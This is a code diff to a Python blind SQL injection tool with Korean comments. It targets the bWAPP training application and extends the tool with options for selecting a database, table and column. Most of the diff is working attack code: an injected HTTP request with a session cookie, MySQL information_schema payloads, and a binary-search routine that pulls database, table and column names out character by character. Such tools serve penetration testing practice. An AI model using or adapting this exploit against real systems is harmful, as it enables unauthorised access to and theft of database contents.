@@ -1,14 +1,11 @@
 # -*- coding: utf-8 -*-   
 from time import sleep
 import sys
-# import pandas as pd
 import urllib
 import requests
 import warnings
 import argparse
 import sqlite3
-
-import uuid
 
 warnings.filterwarnings('ignore')
 
@@ -24,7 +21,7 @@ id_index = 0
 
 
 REQUEST_STRING = """
-GET /bWAPP/sqli_1.php?title=iron1'+or+('iron'+=+case+when+1=1+then+'iron'+end)+--+&action=search HTTP/1.1
+GET /bWAPP/sqli_1.php?title=Iron%'+and+1=1+--+&action=search HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
 Accept-Encoding: gzip, deflate, br
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -33,7 +30,7 @@ Host: 192.168.219.100:8080
 Accept-Language: ko-KR,ko;q=0.9
 Upgrade-Insecure-Requests: 1
 Referer: http://192.168.219.100:8080/bWAPP/sqli_1.php
-Cookie: PHPSESSID=a36649a968899375505575e70dac447a; security_level=0
+Cookie: PHPSESSID=57d928ce50fa0dd6e0e3909cd02a5006; security_level=0
 
 
 """
@@ -43,6 +40,11 @@ def get_argument():
 	parser.add_argument("-s",dest="schema", help="http? https?")
 	parser.add_argument("-p", dest="parameter", help="target param")
 	parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")
+
+	parser.add_argument("-D", dest="select_db", help="select DB")
+	parser.add_argument("-T", dest="select_table", help="select Table")
+	parser.add_argument("-C", dest="select_column", help="select Column")
+
 	parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
 	parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
 	parser.add_argument("--basic", action="store_true", help="Basic info extraction")
@@ -57,39 +59,38 @@ def get_argument():
 
 def result_db_create(name):
 	global cursor, conn
-	conn = sqlite3.connect(name) 
+	conn = sqlite3.connect(name)  # try 사용
 	cursor = conn.cursor()
 
 def result_table_create():
-	cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255))')
-	cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255))')
-	cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255))')
-	# cursor.execute('CREATE TABLE data (id INTEGER PRIMARY KEY AUTOINCREMENT, DB VARCHAR(255), table_ VARCHAR(255), column VARCHAR(255), data VARCHAR(255))')
+	cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), UNIQUE(db_name))')
+	cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), UNIQUE(db_name, table_name))')
+	cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255), UNIQUE(db_name, table_name, column_name))')
 
 def result_set_name(First): # 중복코드 추후 수정
-	global id_index
-	id_index += 1
+	# global id_index
+	# id_index += 1
 	
-	if args.dbs:
-		db_data = cursor.execute(f"INSERT OR REPLACE INTO dbs_info (id, db_name) VALUES ('{id_index}','{First}')")
-		conn.commit()
-	elif args.tables:
-		db_data = cursor.execute(f"INSERT OR REPLACE INTO table_info (id, table_name) VALUES ('{id_index}','{First}')")
-		conn.commit()
-	elif args.columns:
-		db_data = cursor.execute(f"INSERT OR REPLACE INTO column_info (id, column_name) VALUES ('{id_index}','{First}')")
-		conn.commit()
+    if args.dbs:
+        cursor.execute("INSERT OR IGNORE INTO dbs_info (db_name) VALUES (?)", (First,))
+        conn.commit()
+    elif args.tables:
+        cursor.execute("INSERT OR IGNORE INTO table_info (db_name, table_name) VALUES (?, ?)", (args.select_db, First))
+        conn.commit()
+    elif args.columns:
+        cursor.execute("INSERT OR IGNORE INTO column_info (db_name, table_name, column_name) VALUES (?, ?, ?)", (args.select_db, args.select_table, First))
+        conn.commit()
 
-def result_get_name():
-	list_1 = []
+# def result_get_name():
+# 	list_1 = []
 
-	if args.dbs:
-		cursor.execute(f"SELECT db_name FROM dbs_info")
-		rows = cursor.fetchall()
-		for row in rows:
-			list_1.append(row[0])
+# 	if args.dbs:
+# 		cursor.execute(f"SELECT db_name FROM dbs_info")
+# 		rows = cursor.fetchall()
+# 		for row in rows:
+# 			list_1.append(row[0])
 	
-	return list_1
+# 	return list_1
 
 	# elif args.tables:
 	# 	cursor.execute(f"11")
@@ -184,16 +185,16 @@ def setpayload():
 		if args.tables:
 			print("[*] MySQL 테이블 출력 Start")
 			payloads = {
-				'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema')>{mid_val}",
-				'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT {rows},1)))>{mid_val}",
-				'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}'))>{mid_val}",
+				'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1)))>{mid_val}",
+				'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 			}
 		if args.columns:
 			print("[*] MySQL 컬럼 출력 Start")
 			payloads = {
-				'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_name='{table_name}')>{mid_val}",
-				'len' : "(SELECT length((SELECT table_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {rows},1)))>{mid_val}",
-				'columns' : "ascii(substr((SELECT table_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}'))>{mid_val}",
+			    'len' : "(SELECT length((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1)))>{mid_val}",
+				'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 			}
 		else:
 			print("Use --help for more info. (mysql)")
@@ -239,12 +240,12 @@ def check_condition(data, method, url, path, headers):
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
 	
-def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=None, table_name=None, column_name=None):
+def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=None, select_db=None, select_table=None, select_column=None):
 
 	# print(table_name)
 	mid_val = int((min_val+max_val)/2)
 	payload_insert = payload_fix
-	payload_insert = payload_insert.format(rows=rows, substr_index=substr_index, mid_val=mid_val, table_name=table_name, column_name=column_name)
+	payload_insert = payload_insert.format(rows=rows, substr_index=substr_index, mid_val=mid_val, select_db=select_db, select_table=select_table, select_column=select_column)
 	data_val['data'][args.parameter] = payload_insert
 	
 	bin_result = connection(**data_val) # payload 삽입 및 요청
@@ -253,8 +254,8 @@ def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=N
 			return max_val
 		return min_val         
 	if bin_result: # 30 130 160 / 2 = 80
-		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows, table_name, column_name)
-	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows, table_name, column_name)
+		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows, select_db, select_table, select_column)
+	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows, select_db, select_table, select_column)
 		
 def connection(data, method, url, path, headers):
 	data[args.parameter] = url_decode(data[args.parameter])
@@ -275,25 +276,26 @@ def connection(data, method, url, path, headers):
 	return 0    # false
 
 def query_start():
-	result_table_create()
-	payloads = setpayload()
-	data, condition = parse_request(REQUEST_STRING)
-	check_condition(**data)
-	result_payload = payload_set(condition, payloads)
+	result_table_create() # 결과를 저장할 SQLite 테이블 생성
+	payloads = setpayload() # 인수에 따른 페이로드 셋팅
+	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
+	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도)
+	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스
 
 	name_str = "" # 한문자 씩 찾아서 저장할 변수
 	# name_tmp = [] #  name_str 에 저장된 변수를 append 할 배열변수
 
 
 	row_count = 1 # 행 개수
-	row_data = [] # 행 배열
-	col_count = 1 # 열 개수
-	col_data = [] # 열 배열
+	# row_data = [] # 행 배열
+	# col_count = 1 # 열 개수
+	# col_data = [] # 열 배열
 	table_name = []
 	data_len  = 0
 	dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수
 
-	row_count = recursive(0, 127, data, result_payload['count'],None, None, table_name)
+
+	row_count = recursive(0, 127, data, result_payload['count'],None, None, args.select_db, args.select_table, None)
 	name_str_list =[[None] * 1 for _ in range(row_count)] # 2차원 배열 생성 열을 지정할 방법 생각해야됨
 	print("[*] 총 레코드 수 : " + str(row_count))
 
@@ -302,12 +304,12 @@ def query_start():
 			if key == 'count':
 				continue
 			elif key == 'len':
-				data_len  = recursive(0, 127, data, value, None, rows, table_name)
+				data_len  = recursive(0, 127, data, value, None, rows, args.select_db, args.select_table, None)
 				print("테이블 이름 길이 : " + str(data_len))
 			else:
 				name_str = ""
 				for substr_index in range(0, data_len, 1):
-					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, table_name))
+					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, args.select_db, args.select_table, None))
 					name_str_list[rows][0] = name_str
 					print(name_str)
 				table_name = result_set_name(name_str)
